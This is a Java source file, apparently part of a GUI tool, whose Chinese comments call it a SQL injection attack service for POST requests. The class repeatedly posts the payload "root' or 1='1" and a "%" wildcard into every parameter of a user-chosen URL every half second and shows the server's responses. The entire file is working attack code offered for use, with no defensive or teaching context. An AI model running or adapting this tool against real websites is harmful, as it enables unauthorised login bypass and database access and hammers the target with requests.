package com.lzf.inject;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

import com.lzf.gui.MainPanel;

/**
 * POST请求的SQL注入攻击服务
 *
 */
public class PostSQLInject extends Thread {
	private String url;
	private String params;
	private boolean isSQLInject = false; // 是否执行SQL注入攻击：true开始攻击或正在攻击；false停止攻击。

	public boolean isSQLInject() {
		return isSQLInject;
	}

	public void setSQLInject(boolean isSQLInject) {
		this.isSQLInject = isSQLInject;
	}

	public String getUrl() {
		return url;
	}

	public void setUrl(String url) {
		this.url = url;
	}

	public String getParams() {
		return params;
	}

	public void setParams(String params) {
		this.params = params;
	}

	/**
	 * 将流转化为二进制数组 从流中读取数据
	 */
	private byte[] binary(InputStream inputStream) throws IOException {
		ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
		byte[] buffer = new byte[1024];
		int len = 0;
		// 从输入流中读取一定数量的字节，并将其存储在缓冲区数组buffer中
		while ((len = inputStream.read(buffer)) != -1) {
			byteArrayOutputStream.write(buffer, 0, len);
		}
		inputStream.close();
		return byteArrayOutputStream.toByteArray();
	}

	/**
	 * 发送POST请求
	 */
	private void post(String data) {
		String message = "fail"; // 连接不到服务器，请检查你的网络或稍后重试
		try {
			System.out.println(data);
			HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(url).openConnection();
			httpURLConnection.setRequestMethod("POST");
			httpURLConnection.setConnectTimeout(5000);
			httpURLConnection.setReadTimeout(5000);
			httpURLConnection.setDoInput(true);
			httpURLConnection.setDoOutput(true);
			// 设置为false,POST方式不能缓存
			httpURLConnection.setUseCaches(false);
			httpURLConnection.setRequestProperty("connection", "keep-alive");
			OutputStream output = httpURLConnection.getOutputStream();
			output.write(data.getBytes());
			// 刷新此输出流并强制写出所有缓冲的输出字节
			output.flush();
			output.close();
			if (httpURLConnection.getResponseCode() == 200) {
				InputStream inputStream = httpURLConnection.getInputStream();
				byte[] bt = binary(inputStream);
				// 返回字符串
				message = new String(bt, "UTF-8");
			} else {
				message += "：" + httpURLConnection.getResponseCode() + "；" + httpURLConnection.getResponseMessage();
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
		MainPanel.setText(message);
	}

	@Override
	public void run() {
		super.run();
		while (isSQLInject) {
			try {
				String[] paramsArray = params.split("-");
				String data = "";
				for (int i = 0; i < paramsArray.length; i++) {
					if (i < paramsArray.length - 1) {
						data += paramsArray[i] + "=" + URLEncoder.encode("root' or 1='1", "UTF-8") + "&";
					} else {
						data += paramsArray[i] + "=" + URLEncoder.encode("root' or 1='1", "UTF-8");
					}
				}
				post(data);
				Thread.sleep(500);
				data = "";
				for (int i = 0; i < paramsArray.length; i++) {
					if (i < paramsArray.length - 1) {
						data += paramsArray[i] + "=" + URLEncoder.encode("%", "UTF-8") + "&";
					} else {
						data += paramsArray[i] + "=" + URLEncoder.encode("%", "UTF-8");
					}
				}
				post(data);
				Thread.sleep(500);
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

}
